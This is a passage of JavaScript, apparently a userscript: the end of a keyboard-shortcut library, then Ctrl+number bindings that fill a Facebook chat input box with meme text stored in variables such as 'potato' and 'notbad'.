				'right':39,
				'down':40,
	
				'f1':112,
				'f2':113,
				'f3':114,
				'f4':115,
				'f5':116,
				'f6':117,
				'f7':118,
				'f8':119,
				'f9':120,
				'f10':121,
				'f11':122,
				'f12':123
			}
	
			var modifiers = { 
				shift: { wanted:false, pressed:false},
				ctrl : { wanted:false, pressed:false},
				alt  : { wanted:false, pressed:false},
				meta : { wanted:false, pressed:false}	
			};
                        
			if(e.ctrlKey)	modifiers.ctrl.pressed = true;
			if(e.shiftKey)	modifiers.shift.pressed = true;
			if(e.altKey)	modifiers.alt.pressed = true;
			if(e.metaKey)   modifiers.meta.pressed = true;
                        
			for(var i=0; k=keys[i],i<keys.length; i++) {
				
				if(k == 'ctrl' || k == 'control') {
					kp++;
					modifiers.ctrl.wanted = true;

				} else if(k == 'shift') {
					kp++;
					modifiers.shift.wanted = true;

				} else if(k == 'alt') {
					kp++;
					modifiers.alt.wanted = true;
				} else if(k == 'meta') {
					kp++;
					modifiers.meta.wanted = true;
				} else if(k.length > 1) { 
					if(special_keys[k] == code) kp++;
					
				} else if(opt['keycode']) {
					if(opt['keycode'] == code) kp++;

				} else {
					if(character == k) kp++;
					else {
						if(shift_nums[character] && e.shiftKey) { 
							character = shift_nums[character]; 
							if(character == k) kp++;
						}
					}
				}
			}
			
			if(kp == keys.length && 
						modifiers.ctrl.pressed == modifiers.ctrl.wanted &&
						modifiers.shift.pressed == modifiers.shift.wanted &&
						modifiers.alt.pressed == modifiers.alt.wanted &&
						modifiers.meta.pressed == modifiers.meta.wanted) {
				callback(e);
	
				if(!opt['propagate']) { 
					e.cancelBubble = true;
					e.returnValue = false;
	
					if (e.stopPropagation) {
						e.stopPropagation();
						e.preventDefault();
					}
					return false;
				}
			}
		}
		this.all_shortcuts[shortcut_combination] = {
			'callback':func, 
			'target':ele, 
			'event': opt['type']
		};
		
		if(ele.addEventListener) ele.addEventListener(opt['type'], func, false);
		else if(ele.attachEvent) ele.attachEvent('on'+opt['type'], func);
		else ele['on'+opt['type']] = func;
	},

	'remove':function(shortcut_combination) {
		shortcut_combination = shortcut_combination.toLowerCase();
		var binding = this.all_shortcuts[shortcut_combination];
		delete(this.all_shortcuts[shortcut_combination])
		if(!binding) return;
		var type = binding['event'];
		var ele = binding['target'];
		var callback = binding['callback'];

		if(ele.detachEvent) ele.detachEvent('on'+type, callback);
		else if(ele.removeEventListener) ele.removeEventListener(type, callback, false);
		else ele['on'+type] = false;
	}
	 
}
shortcut.add('Ctrl+1',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = mean; });
shortcut.add('Ctrl+2',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = hitler; });
shortcut.add('Ctrl+3',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = hardcore; });
shortcut.add('Ctrl+4',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = worthit; });
shortcut.add('Ctrl+5',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = bitchplease; });
shortcut.add('Ctrl+6',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = trues; });
shortcut.add('Ctrl+7',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = potato; });
shortcut.add('Ctrl+8',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = stopyou; });
shortcut.add('Ctrl+9',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = notbad; });
shortcut.add('Ctrl+0',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = badluck; });